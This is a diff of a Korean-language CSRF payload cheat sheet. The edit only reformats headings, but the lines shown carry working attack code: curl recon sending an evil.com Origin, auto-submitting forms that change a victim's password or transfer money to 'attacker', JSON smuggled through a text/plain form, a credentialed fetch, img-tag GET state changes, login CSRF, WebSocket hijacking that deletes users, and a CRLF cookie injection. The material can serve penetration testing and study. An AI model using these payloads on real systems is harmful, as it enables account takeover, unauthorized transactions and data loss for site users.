@@ -1,6 +1,6 @@
 ### 정찰 페이로드
 
-**SameSite 쿠키 속성 확인:**
+#### SameSite 쿠키 속성 확인
 ```
 curl -v "https://target/auth/login" 2>&1 | grep -i 'set-cookie'
 ```
@@ -12,7 +12,7 @@ curl -v "https://target/auth/login" 2>&1 | grep -i 'set-cookie'
 | `Lax` | GET 상태변경만 |
 | `Strict` | 불가 |
 
-**CORS 정책 확인 (preflight 비교):**
+#### CORS 정책 확인 (preflight 비교)
 ```
 curl -sI -H "Origin: https://evil.com" "https://target/api/<endpoint>" | grep -iE '^access-control-'
 curl -sI -X OPTIONS -H "Origin: https://evil.com" \
@@ -21,7 +21,7 @@ curl -sI -X OPTIONS -H "Origin: https://evil.com" \
   "https://target/api/<endpoint>" | grep -iE '^access-control-'
 ```
 
-**Sec-Fetch 헤더 응답 확인 (모던 브라우저 검증 활용 여부):**
+#### Sec-Fetch 헤더 응답 확인 (모던 브라우저 검증 활용 여부)
 ```
 curl -v "https://target/api/<endpoint>" -H "Sec-Fetch-Site: cross-site" 2>&1 | grep -i "^< HTTP"
 # 거부되면 Sec-Fetch-Site 검증 활용
@@ -31,7 +31,7 @@ curl -v "https://target/api/<endpoint>" -H "Sec-Fetch-Site: cross-site" 2>&1 | g
 
 ### 기본 페이로드
 
-**HTML form (auto-submit, simple request):**
+#### HTML form (auto-submit, simple request)
 ```html
 <form action="https://target/api/change-password" method="POST" id=f>
   <input name="new_password" value="hacked123">
@@ -39,7 +39,7 @@ curl -v "https://target/api/<endpoint>" -H "Sec-Fetch-Site: cross-site" 2>&1 | g
 <script>document.getElementById('f').submit()</script>
 ```
 
-**HTML form (multipart/form-data — preflight 미발생):**
+#### HTML form (multipart/form-data — preflight 미발생)
 ```html
 <form action="https://target/api/upload" method="POST" enctype="multipart/form-data" id=f>
   <input name="file" type="file">
@@ -47,7 +47,7 @@ curl -v "https://target/api/<endpoint>" -H "Sec-Fetch-Site: cross-site" 2>&1 | g
 <script>document.getElementById('f').submit()</script>
 ```
 
-**HTML form (text/plain — preflight 미발생, JSON 파서 통과 시):**
+#### HTML form (text/plain — preflight 미발생, JSON 파서 통과 시)
 ```html
 <form action="https://target/api/transfer" method="POST" enctype="text/plain" id=f>
   <input name='{"to":"attacker","amount":1000,"x":' value='"y"}'>
@@ -55,7 +55,7 @@ curl -v "https://target/api/<endpoint>" -H "Sec-Fetch-Site: cross-site" 2>&1 | g
 <script>document.getElementById('f').submit()</script>
 ```
 
-**AJAX (CORS credentials):**
+#### AJAX (CORS credentials)
 ```javascript
 fetch('https://target/api/change-email', {
   method: 'POST',
@@ -66,13 +66,13 @@ fetch('https://target/api/change-email', {
 // CORS preflight 응답에 Access-Control-Allow-Credentials: true + Origin 반사면 가능
 ```
 
-**GET 상태변경 (SameSite=Lax 통과):**
+#### GET 상태변경 (SameSite=Lax 통과)
 ```html
 <img src="https://target/api/transfer?to=attacker&amount=1000">
 <a href="https://target/api/delete?id=victim">click</a>
 ```
 
-**Login CSRF (공격자 계정으로 강제 로그인):**
+#### Login CSRF (공격자 계정으로 강제 로그인)
 ```html
 <form action="https://target/login" method="POST" id=f>
   <input name="username" value="attacker_account">
@@ -81,7 +81,7 @@ fetch('https://target/api/change-email', {
 <script>document.getElementById('f').submit()</script>
 ```
 
-**CSWSH (WebSocket Hijacking):**
+#### CSWSH (WebSocket Hijacking)
 ```javascript
 const ws = new WebSocket('wss://target/ws');
 ws.onopen = () => ws.send(JSON.stringify({action:'admin_delete', userId:'victim'}));
@@ -106,7 +106,7 @@ ws.onopen = () => ws.send(JSON.stringify({action:'admin_delete', userId:'victim'
 | 토큰 GET URL 포함 | 외부 링크 클릭 시 Referer로 노출 → 재사용 |
 | Sec-Fetch-Site 검증 | `<meta http-equiv="referrer" content="no-referrer">`로 Sec-Fetch metadata 일부 변형 (브라우저 의존) |
 
-**Cookie 주입 게이트 (다른 취약점 결합):**
+#### Cookie 주입 게이트 (다른 취약점 결합)
 ```
 # CRLF로 Set-Cookie 주입
 GET /redirect?url=evil%0d%0aSet-Cookie:csrf_token=ATTACKER_VAL HTTP/1.1
